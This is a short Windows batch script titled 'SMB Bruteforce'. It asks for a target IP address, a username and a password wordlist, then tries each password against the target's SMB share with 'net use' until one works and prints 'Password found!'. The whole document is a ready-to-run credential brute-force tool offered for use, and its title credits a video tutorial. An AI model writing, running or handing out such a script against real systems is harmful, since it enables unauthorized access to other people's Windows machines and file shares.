@echo off
title SMB Bruteforce - by doodles (credits to ebola man for the vid on how to do this)
color A
echo
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List if you dont have one i have one in the github: "

for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt

)
echo Password Not Found :(
pause
exit

:succss
echo Password found! :)
net use \\%ip% /d /y 
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo attempt: %pass%
if %errorlevel% EQU 0 goto succss
